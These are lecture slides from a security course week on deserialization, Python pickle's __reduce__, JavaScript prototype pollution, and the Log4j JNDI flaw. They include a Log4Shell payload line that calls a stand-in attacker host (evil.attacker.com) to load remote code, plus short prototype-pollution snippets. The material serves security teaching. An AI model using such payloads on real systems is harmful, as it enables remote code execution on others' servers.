<!doctype html><html lang=en><head><meta charset=utf-8><title>x5 deserialization and pp</title>
<meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><link rel=stylesheet href=../../reveal-js/css/reset.css><link rel=stylesheet href=../../reveal-js/css/reveal.css><link rel=stylesheet href=../../reveal-js/css/theme/black.css id=theme><link rel=stylesheet href=../../highlight-js/default.min.css></head><body><div class=reveal><div class=slides><section><h2 id=well-get-started-at-2005>We&rsquo;ll get started at 20:05</h2></section><section data-noprocess data-shortcode-slide class=center><h2 id=deserialization--prototype-pollution>deserialization && prototype pollution</h2><h3 id=6843-week5>6843 week5</h3></section><section><section data-shortcode-section><h2 id=serialization>serialization</h2></section><section><h3 id=what-is-serialization>what is serialization</h3><ul><li>converting an object&rsquo;s state (data/structure) into a format that can be stored/transmitted.</li><li>relatively straight-forward for simple types (e.g. strings, numbers), not so much others.</li><li>all code is constantly serialized & stored in memory.</li></ul></section><section><h3 id=can-anyone-think-of-examples-of-serialization>can anyone think of examples of serialization</h3><ul><li>writing data to files<ul><li>csv</li><li>json</li></ul></li><li>storing stuff in a database</li><li>sending data over a network</li><li>a webserver receiving traffic</li><li>protobufs!!1</li></ul></section><section><h3 id=is-this-exploitable>is this exploitable</h3><ul><li>not necessarily that dangerous</li><li>this is control > data</li><li>you&rsquo;re turning structures into some format</li></ul></section></section><section><section data-shortcode-section><h2 id=deserialization>deserialization</h2></section><section><h3 id=what-is-it>what is it</h3><ul><li>as expected, the opposite of serialization</li><li>turning serialized data (e.g. a string) back into code/data structures/objects</li><li>this is data > control</li></ul></section><section><h3 id=type-confusion>type confusion</h3><blockquote><p>when a program misinterprets the type of data its being provided</p></blockquote><ul><li>this can cause crashes, memory corruption, unexpected behaviour (<strong>the good stuff</strong>)</li><li>what if the program expects a specific type of object during deserialization, but receives something else</li></ul></section><section><h3 id=what-type-of-vulnerability-is-this>what type of vulnerability is this</h3><ul><li>the core problem is untrusted user input (what a surprise)</li><li>this is both an &ldquo;attacking implementation&rdquo; vulnerability, and an attacking design vulnerability</li><li>there may be vulnerabilities in the deserialization of a specific type of object (some examples here)</li></ul></section></section><section><section data-shortcode-section><p>I turned myself into a</p><h2 id=python-pickle>python pickle</h2></section><section><h3 id=what-is-it>what is it</h3><p>pickle is a python serialization library which can be used to save objects (even complex ones like lists, dictionaries, and custom objects)</p><pre tabindex=0><code>import pickle

class User:
    def __init__(self, name):
        self.name = name

user = User(&#34;Alice&#34;)
serialized_data = pickle.dumps(user)

deserialized_user = pickle.loads(serialized_data)
print(deserialized_user.name)
</code></pre></section><section><h3 id=what-about-for-more-complex-types>what about for more complex types?</h3><ul><li>If I have a <strong>custom</strong> type, I&rsquo;ll need some way to tell pickle how to serialize it</li><li>Not every object will serialize well (<a href=https://stackoverflow.com/a/19874769>e.g. file handles</a>). What would you store?</li><li>We need some way for user&rsquo;s to specify how to deserialize non-simple types.</li></ul></section><section><h3 id=how-pickle-does-it>how pickle does it</h3><blockquote><p>To the <a href=https://docs.python.org/2/library/pickle.html#pickling-and-unpickling-extension-types>docs</a>.</p></blockquote><ul><li>When serializing objects, pickle will call the <code>__reduce__</code> method on an object to determine what to store</li><li>This function should return a tuple, containing a function to call, and it&rsquo;s arguments</li><li>This function will be called when deserializing</li></ul></section><section><h3 id=an-example>an example</h3><ul><li>Say you have a custom Logger class, that writes to log files</li><li>It might store a file handle, which can&rsquo;t be serialized</li><li>Instead, when serializing, store the filehandle, and when deserializing, create an instance of the class with that file handle</li></ul></section><section><h3 id=code>code</h3><pre tabindex=0><code>class Logger:
    def __init__(self, filename):
        self.filename = filename
        self.file = open(filename, &#34;a&#34;)

    def log(self, message):
        self.file.write(message + &#34;\n&#34;)
        self.file.flush()

    def __reduce__(self):
        # Return a tuple with the class constructor and its arguments
        return (self.__class__, (self.filename,))

# Create a logger instance
logger = Logger(&#34;log.txt&#34;)

# Pickle the logger
with open(&#34;logger.pkl&#34;, &#34;wb&#34;) as file:
    pickle.dump(logger, file)

# Later, unpickle it
with open(&#34;logger.pkl&#34;, &#34;rb&#34;) as file:
    loaded_logger = pickle.load(file)

# The file is reopened correctly!
loaded_logger.log(&#34;This is a test log after unpickling.&#34;)
</code></pre></section><section><h3 id=demo>demo</h3></section></section><section><section data-shortcode-section><h2 id=prototype-pollution>prototype pollution</h2></section><section><h3 id=inheritance>inheritance</h3><ul><li>for compiled languages like java, relationships are well-defined at <strong>compile time</strong></li><li>for interpreted languages, these relationships must be able to change at <strong>runtime</strong></li></ul></section><section><h3 id=kinda-similar-to-mro-in-python>kinda similar to mro in python</h3><ul><li>javascript doesn&rsquo;t have traditional class-based multiple inheritance</li><li>instead it has prototype chaining (& mixins)</li><li><strong>all objects lead back to the same prototype</strong></li></ul></section><section><h3 id=how-are-attributes-resolved>how are attributes resolved?</h3><ol><li>own properties</li><li>its prototype (&ldquo;parent&rdquo;)</li><li>its prototypes prototype</li><li>so on
similarly</li></ol></section><section><h3 id=how-to-exploit-this>how to exploit this?</h3><ul><li>what if we changed the prototype of one object</li><li>would it [ae]ffect others?</li></ul><pre tabindex=0><code>Object.prototype.test = &#34;This is dangerous!&#34;;

const obj = {};
console.log(obj.test); // &#34;This is dangerous!&#34;
</code></pre><p>what about:</p><pre tabindex=0><code>let a = {}, b = {}
a.__proto__.test = 123

console.log(b.test); // 123
</code></pre></section><section><h3 id=demo>demo</h3></section></section><section><section data-shortcode-section><h2 id=log4j>log4j</h2></section><section><h3 id=what-was-it>what was it</h3><ul><li>quite similar to SSTI</li><li>again improper input validation, this time in how log4j handled JNDI lookups</li></ul></section><section><h3 id=what-was-the-purpose-of-jndi>what was the purpose of jndi</h3><ul><li>it was used to access dynamic resources when the log is being created, e.g.<ul><li>information about the server</li><li>accessing databases (via JDBC DataSources)</li><li>remote objects (e.g., RMI, CORBA)</li><li>ldap directories (for user authentication and configuration)</li><li>messaging services (like JMS)</li></ul></li></ul></section><section><h3 id=how-was-it-exploited>how was it exploited</h3><ul><li>Essentially there was no input validation to ensure user&rsquo;s couldn&rsquo;t provide their own jndi lookups</li><li>This meant you could get the package to call out and execute arbitrary java code (RCE)</li></ul><pre tabindex=0><code>${jndi:ldap://evil.attacker.com/malicious_payload}
</code></pre></section><section><h3 id=how-bad-was-this>how bad was this</h3><ul><li>What is the attack surface on this vulnerability?</li><li>When do messages get logged?</li></ul></section><section><h3 id=meme-an-aside>meme: an aside</h3><p>how was it discovered</p><ul><li>It existed since 2013</li><li>Idk if it&rsquo;s true, but I&rsquo;ve heard it was first exploited against Minecraft servers</li><li><a href=https://github.com/apache/logging-log4j2/pull/608>quick fix</a></li></ul></section><section><h3 id=per-a-random-person-on-ycombinator>per a random person on ycombinator</h3><pre tabindex=0><code>Nov 24 - Wednesday - Report of issue
Nov 25 - Thursday  - Thanksgiving
Nov 29 - Monday    - Work done
Nov 30 - Tuesday   - PR submitted
Dec  9 - Thursday  - &#34;Is it a security vulnerability?&#34;
Dec 10 - Friday    - All hell breaks loose (Log4j 2.15.0 released)
Dec 13 - Monday    - Java devs updating libraries furiously (Log4j 2.16.0 released)
Dec 18 - Saturday  - Wait? there&#39;s more (Log4j 2.17.0 released)
...
Dec 27 - Monday    - Enough already (Log4j 2.17.1 released)
</code></pre></section></section></div></div><script type=text/javascript src=../../reveal-hugo/object-assign.js></script><a href=../../reveal-js/css/print/ id=print-location style=display:none></a><script type=text/javascript>var printLocationElement=document.getElementById("print-location"),link=document.createElement("link");link.rel="stylesheet",link.type="text/css",link.href=printLocationElement.href+(window.location.search.match(/print-pdf/gi)?"pdf.css":"paper.css"),document.getElementsByTagName("head")[0].appendChild(link)</script><script type=application/json id=reveal-hugo-site-params>null</script><script type=application/json id=reveal-hugo-page-params>null</script><script src=../../reveal-js/js/reveal.js></script><script type=text/javascript>function camelize(e){return e&&Object.keys(e).forEach(function(t){newK=t.replace(/(_\w)/g,function(e){return e[1].toUpperCase()}),newK!=t&&(e[newK]=e[t],delete e[t])}),e}var revealHugoDefaults={center:!0,controls:!0,history:!0,progress:!0,transition:"slide"},revealHugoSiteParams=JSON.parse(document.getElementById("reveal-hugo-site-params").innerHTML),revealHugoPageParams=JSON.parse(document.getElementById("reveal-hugo-page-params").innerHTML),options=Object.assign({},camelize(revealHugoDefaults),camelize(revealHugoSiteParams),camelize(revealHugoPageParams));Reveal.initialize(options)</script><script type=text/javascript src=../../reveal-js/plugin/markdown/marked.js></script><script type=text/javascript src=../../reveal-js/plugin/markdown/markdown.js></script><script type=text/javascript src=../../reveal-js/plugin/highlight/highlight.js></script><script type=text/javascript src=../../reveal-js/plugin/zoom-js/zoom.js></script><script type=text/javascript src=../../reveal-js/plugin/notes/notes.js></script></body></html>